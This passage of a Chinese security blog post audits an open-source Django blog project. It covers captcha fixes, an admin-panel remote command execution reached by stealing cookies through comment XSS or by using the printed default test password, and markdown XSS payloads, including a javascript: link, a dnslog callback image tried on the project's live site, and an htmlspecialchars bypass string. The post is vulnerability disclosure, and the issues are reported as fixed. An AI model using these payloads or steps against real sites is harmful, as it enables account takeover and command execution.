Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_random</span>():</span><br><span class="line">    <span class="keyword">return</span> random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>),random.randint(<span class="number">0</span>,<span class="number">255</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 最终步骤4:写图片验证码</span></span><br><span class="line">    img_obj = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (<span class="number">470</span>, <span class="number">80</span>), get_random())</span><br><span class="line">    img_draw = ImageDraw.Draw(img_obj)  <span class="comment"># 产生一个画笔对象</span></span><br><span class="line">    img_font = ImageFont.truetype(<span class="string">&#x27;blog/static/font/222.ttf&#x27;</span>, <span class="number">75</span>)  <span class="comment"># 字体样式 大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 随机验证码  五位数的随机验证码  数字 小写字母 大写字母</span></span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        random_upper = <span class="built_in">chr</span>(random.randint(<span class="number">65</span>,<span class="number">90</span>))</span><br><span class="line">        random_lower = <span class="built_in">chr</span>(random.randint(<span class="number">97</span>,<span class="number">122</span>))</span><br><span class="line">        random_int = <span class="built_in">str</span>(random.randint(<span class="number">0</span>,<span class="number">9</span>))</span><br><span class="line">        <span class="comment"># 从上面三个里面随机选择一个</span></span><br><span class="line">        tmp = random.choice([random_lower,random_upper,random_int])</span><br><span class="line">        <span class="comment"># 将产生的随机字符串写入到图片上</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        为什么一个个写而不是生成好了之后再写</span></span><br><span class="line"><span class="string">        因为一个个写能够控制每个字体的间隙 而生成好之后再写的话</span></span><br><span class="line"><span class="string">        间隙就没法控制了</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        img_draw.text((i*<span class="number">60</span>+<span class="number">60</span>,-<span class="number">2</span>),tmp,get_random(),img_font)</span><br><span class="line">        <span class="comment"># 拼接随机字符串</span></span><br><span class="line">        code += tmp</span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    <span class="comment"># 随机验证码在登陆的视图函数里面需要用到 要比对 所以要找地方存起来并且其他视图函数也能拿到</span></span><br><span class="line">    request.session[<span class="string">&#x27;code&#x27;</span>] = code</span><br><span class="line">    io_obj = BytesIO()</span><br><span class="line">    img_obj.save(io_obj,<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(io_obj.getvalue())</span><br></pre></td></tr></table></figure>

<p>在LoginView类视图下再增加post方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    code = self.request.POST.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code <span class="keyword">and</span> code.upper() == self.request.session.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper():</span><br><span class="line">        <span class="comment"># 验证码通过验证</span></span><br><span class="line">        form = AuthenticationForm(data=self.request.POST, request=self.request)</span><br><span class="line">        <span class="keyword">if</span> form.is_valid():</span><br><span class="line">            <span class="comment"># 登录成功逻辑</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>(LoginView, self).form_valid(form)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 登录失败逻辑</span></span><br><span class="line">            error_msg = <span class="string">&quot;账户密码错误&quot;</span></span><br><span class="line">            <span class="keyword">return</span> self.render_to_response(&#123;<span class="string">&#x27;form&#x27;</span>: form, <span class="string">&#x27;error_msg&#x27;</span>: error_msg&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 验证码验证失败</span></span><br><span class="line">        error_msg = <span class="string">&#x27;验证码错误&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.render_to_response(&#123;<span class="string">&#x27;error_msg&#x27;</span>: error_msg&#125;)</span><br></pre></td></tr></table></figure>

<p>由于忘记密码那里是6位数，没有增加验证码的必要，所以我们在注册加</p>
<p><code>account/registration_form.html</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends <span class="string">&#x27;share_layout/base_account.html&#x27;</span> %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &lt;div <span class="keyword">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;h2 <span class="keyword">class</span>=<span class="string">&quot;form-signin-heading text-center&quot;</span>&gt;Create Your Account&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div <span class="keyword">class</span>=<span class="string">&quot;card card-signin&quot;</span>&gt;</span><br><span class="line">            &lt;img <span class="keyword">class</span>=<span class="string">&quot;img-circle profile-img&quot;</span> src=<span class="string">&quot;&#123;% static &#x27;blog/img/avatar.png&#x27; %&#125;&quot;</span> alt=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">            &lt;form <span class="keyword">class</span>=<span class="string">&quot;form-signin&quot;</span> action=<span class="string">&quot;&#123;% url &#x27;account:register&#x27; %&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">                &#123;% csrf_token %&#125;</span><br><span class="line">                &#123;&#123; error_msg &#125;&#125;</span><br><span class="line">                &#123;&#123; form.non_field_errors &#125;&#125;</span><br><span class="line">                &#123;% <span class="keyword">for</span> field <span class="keyword">in</span> form %&#125;</span><br><span class="line">                    &#123;&#123; field &#125;&#125;</span><br><span class="line">                    &#123;&#123; field.errors &#125;&#125;</span><br><span class="line">                &#123;% endfor %&#125;</span><br><span class="line">                &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">&quot;&quot;</span>&gt;验证码&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">                &lt;div <span class="keyword">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span><br><span class="line">                    &lt;div <span class="keyword">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span><br><span class="line">                        &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;code&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;id_code&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span>&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    &lt;div <span class="keyword">class</span>=<span class="string">&quot;col-md-6&quot;</span>&gt;</span><br><span class="line">                        &lt;img src=<span class="string">&quot;/get_code/&quot;</span> alt=<span class="string">&quot;&quot;</span> width=<span class="string">&quot;100&quot;</span> height=<span class="string">&quot;50&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;id_img&quot;</span>&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">                &lt;button <span class="keyword">class</span>=<span class="string">&quot;btn btn-lg btn-primary btn-block&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;Create Your Account&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;p <span class="keyword">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span><br><span class="line">            &lt;a href=<span class="string">&quot;&#123;% url &quot;</span>account:login<span class="string">&quot; %&#125;&quot;</span>&gt;Sign In&lt;/a&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt; &lt;!-- /container --&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j4qER"><img src="https://s1.ax1x.com/2023/05/30/p9j4qER.png" alt="p9j4qER.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j4v8K"><img src="https://s1.ax1x.com/2023/05/30/p9j4v8K.png" alt="p9j4v8K.png"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self, request, *args, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">        code = self.request.POST.get(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code <span class="keyword">and</span> code.upper() == self.request.session.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>).upper():</span><br><span class="line">            <span class="comment"># 验证码通过验证</span></span><br><span class="line">            form = AuthenticationForm(data=self.request.POST, request=self.request)</span><br><span class="line">            <span class="keyword">if</span> form.is_valid():</span><br><span class="line">                <span class="comment"># 登录成功逻辑</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>(LoginView, self).form_valid(form)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 登录失败逻辑</span></span><br><span class="line">                error_msg = <span class="string">&quot;账户密码错误&quot;</span></span><br><span class="line">                <span class="keyword">return</span> self.render_to_response(&#123;<span class="string">&#x27;form&#x27;</span>: form, <span class="string">&#x27;error_msg&#x27;</span>: error_msg&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 验证码验证失败</span></span><br><span class="line">            error_msg = <span class="string">&#x27;验证码错误&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> self.render_to_response(&#123;<span class="string">&#x27;error_msg&#x27;</span>: error_msg&#125;)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j5nKg"><img src="https://s1.ax1x.com/2023/05/30/p9j5nKg.png" alt="p9j5nKg.png"></a></p>
<p>验证码不正确就会返回</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9j5urQ"><img src="https://s1.ax1x.com/2023/05/30/p9j5urQ.png" alt="p9j5urQ.png"></a></p>
<p>另外就是</p>
<h4 id="后台RCE"><a href="#后台RCE" class="headerlink" title="后台RCE"></a>后台RCE</h4><blockquote>
<p>其实这个RCE只要是进后台就有，就通过前台评论区打XSS得到cookie进后台</p>
</blockquote>
<p>有人问如果对方没有开启普通用户注册，那如果留言呢？实际上该项目？</p>
<p>实际上，如果对方在起项目的时候设置添加默认用户，即创建测试数据，终端下执行:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py create_testdata</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLvG9"><img src="https://s1.ax1x.com/2023/05/30/p9jLvG9.png" alt="p9jLvG9.png"></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&#x27;test@test.com&#x27;, username=&#x27;测试用户&#x27;, password=make_password(&#x27;test!q@w#eTYU&#x27;))[0]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试用户</span><br><span class="line">test!q@w#eTYU</span><br></pre></td></tr></table></figure>

<p>你可以用这个默认账户进去再留言</p>
<p>这个RCE是利用了WeRoBot 微信公众号机器人的微信公众号设置，利用条件说难不难，说简单不简单</p>
<p>满足这个RCE需要两个条件：</p>
<p>1）知道某个具备管理员权限用户的密码</p>
<p>2）能够知道已经设置好了的命令</p>
<p>如下</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLCNQ"><img src="https://s1.ax1x.com/2023/05/30/p9jLCNQ.png" alt="p9jLCNQ.png"></a></p>
<p>在机器人里robot.py里这里的<code>__run_command__</code>方法存在os.popen命令执行，通过上一个run方法调用，调用前判断cmd是否存在，如果这个命令[后台设置的，下面会介绍]存在，那么就会执行这个命令下的指令（就是dos指令）</p>
<p>那么cmd到底是什么呢？可控吗？</p>
<p>回到上面条件一，知道某个具备管理员权限用户的密码，通常情况下就是django项目建立时的密码，我们这样先利用评论区打XSS，打到管理员后台，获取了管理员的cookie（该项目没有设置httponly），进入后台</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLZuV"><img src="https://s1.ax1x.com/2023/05/30/p9jLZuV.png" alt="p9jLZuV.png"></a></p>
<p>我们无法通过后台获取管理员密码，即使是修改密码也需要知道旧的密码</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLeBT"><img src="https://s1.ax1x.com/2023/05/30/p9jLeBT.png" alt="p9jLeBT.png"></a></p>
<p>所以我们新创建一个管理员账户</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">batmanfuture</span><br><span class="line">haha123456</span><br></pre></td></tr></table></figure>

<p>添加到管理员权限，保存</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLlC9"><img src="https://s1.ax1x.com/2023/05/30/p9jLlC9.png" alt="p9jLlC9.png"></a></p>
<p>进入微信公众号，这个是你自己的，在你的微信公众号后台设置如下</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLYDK"><img src="https://s1.ax1x.com/2023/05/30/p9jLYDK.png" alt="p9jLYDK.png"></a></p>
<p>这里URL就是<code>http://your_domain/robot</code>，令牌(Token)默认就是<code>lylinux</code></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLtHO"><img src="https://s1.ax1x.com/2023/05/30/p9jLtHO.png" alt="p9jLtHO.png"></a></p>
<p>设置好之后开启，回到后台这里，在命令这里设置好</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jLUED"><img src="https://s1.ax1x.com/2023/05/30/p9jLUED.png" alt="p9jLUED.png"></a></p>
<p>你想执行whoami就在那里设置whoami</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jL6Df"><img src="https://s1.ax1x.com/2023/05/30/p9jL6Df.png" alt="p9jL6Df.png"></a></p>
<p>执行输入admin，然后让输入管理员密码，输入之后，再输入你要执行的命令whoami–&gt;dos下执行whoami指令</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jL2VS"><img src="https://s1.ax1x.com/2023/05/30/p9jL2VS.jpg" alt="p9jL2VS.jpg"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/p9jL7rV"><img src="https://s1.ax1x.com/2023/05/30/p9jL7rV.png" alt="p9jL7rV.png"></a></p>
<p>修复方案也简单，XSS防止了进不了后台进行。</p>
<blockquote>
<p>有人问我为什么最后不利用XSS + CSRF实现管理员一访问就发送添加管理员用户和添加系统命令呢？因为它的settings.py里面设置了CSRF啊宝子</p>
</blockquote>
<p><img src="https://s3.bmp.ovh/imgs/2023/05/31/dbe1a2f76c7d640b.png"><img src="https://s3.bmp.ovh/imgs/2023/05/31/2b940d201f79fdfd.png"></p>
<p>看到CSRF了吧</p>
<p>.</p>
<h4 id="Markdown-XSS"><a href="#Markdown-XSS" class="headerlink" title="Markdown XSS"></a>Markdown XSS</h4><p>可以通过markdown编辑器和渲染包来触发跨站点脚本（XSS）漏洞</p>
<p>markdown是如何处理的？当我们输入如下内容</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](<span class="link">https://cdnjson.com/images/2023/05/28/imaged20730ecaa5935e9.png</span>)</span><br></pre></td></tr></table></figure>

<p>Medium读取markdown中的行，然后生成HTML</p>
<h6 id="触发XSS"><a href="#触发XSS" class="headerlink" title="触发XSS"></a>触发XSS</h6><p>当我们输入如下，当由Medium处理时：</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">Click Me</span>](<span class="link">https://www.example.com/</span>)</span><br></pre></td></tr></table></figure>

<p>变成</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;https://www.example.com/&quot;</span>&gt;<span class="title class_">Click</span> <span class="title class_">Me</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>这里的<code>Click Me</code>和<code>https://www.example.com/</code>我们都是可控的</p>
<p>如果我们通过js伪协议执行js</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<span class="title class_">Click</span> <span class="title class_">Me</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>payload应该这么写</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="title class_">Click</span> <span class="title class_">Me</span>](<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/28/image599871baea8ad8ae.png" alt="image599871baea8ad8ae.png"></p>
<p>但是理想情况下，我们希望仅通过访问页面来执行它</p>
<p>我们可以利用这个图像语法</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">The goodest boy</span>](<span class="link">https://images.unsplash.com/the_good_boy.png</span>)</span><br></pre></td></tr></table></figure>

<p>即可</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;https://images.unsplash.com/the_good_boy.png&quot;</span> alt=<span class="string">&quot;The goodest boy&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>那么由于图像加载失败，弹窗可能首先，所以我们用dnslog验证</p>
<p>即可</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">The goodest boy</span>](<span class="link">http://fl8nw3.ceye.io/haha123.jpg</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;http://fl8nw3.ceye.io/haha.jpg&quot;</span> alt=<span class="string">&quot;The goodest boy&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<p><a target="_blank" rel="noopener" href="https://www.lylinux.net/article/2019/8/5/58.html#div-comment-890">https://www.lylinux.net/article/2019/8/5/58.html#div-comment-890</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Click Me](http://fl8nw3.ceye.io/helloworld.jpg)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdnjson.com/images/2023/05/28/image2810f986b617c793.png" alt="image2810f986b617c793.png"></p>
<p><img src="https://cdnjson.com/images/2023/05/28/image596d53960cb4c117.png" alt="image596d53960cb4c117.png"></p>
<p><a target="_blank" rel="noopener" href="https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md">https://github.com/JakobTheDev/information-security/blob/master/Payloads/md/XSS.md</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$name</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> value=<span class="string">&#x27;&lt;?php echo $name;?&gt;&#x27;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>htmlspecialchars绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/webshell.php?name=&#x27;onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure>





<h4 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h4><p>项目作者发邮件表示感谢，在6.1日左右已修复</p>
<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/103672/19/28855/83123/64cca37dFb4ac1907/c7557f835c59464d.jpg" alt="image.png"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8XSS-%E5%88%A9%E7%94%A8%E5%92%8C%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.</span> <span class="toc-text">存储XSS-利用和修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E4%BC%AA%E9%9D%99%E6%80%81%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">判断伪静态是否存在SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF%E9%83%A8%E7%BD%B2%E5%90%8E%E5%85%B3%E9%97%ADdebug%E6%A8%A1%E5%BC%8F%E3%80%90%E9%9A%8F%E6%84%8F%E3%80%91"><span class="toc-number">3.</span> <span class="toc-text">上线部署后关闭debug模式【随意】</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E9%99%86%EF%BC%8C%E6%B3%A8%E5%86%8C%EF%BC%8C%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E5%8A%9F%E8%83%BD%E5%8F%AF%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">登陆，注册，忘记密码功能可爆破</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0RCE"><span class="toc-number">5.</span> <span class="toc-text">后台RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Markdown-XSS"><span class="toc-number">6.</span> <span class="toc-text">Markdown XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91XSS"><span class="toc-number">6.0.1.</span> <span class="toc-text">触发XSS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E7%BB%AD"><span class="toc-number">7.</span> <span class="toc-text">后续</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&text=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&is_video=false&description=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=github-5.5k star的django项目的代码审计--&gt;RCE&body=Check out this article: http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&title=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&name=github-5.5k star的django项目的代码审计--&gt;RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/05/28/github-5-5k-star%E7%9A%84django%E9%A1%B9%E7%9B%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/&t=github-5.5k star的django项目的代码审计--&gt;RCE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
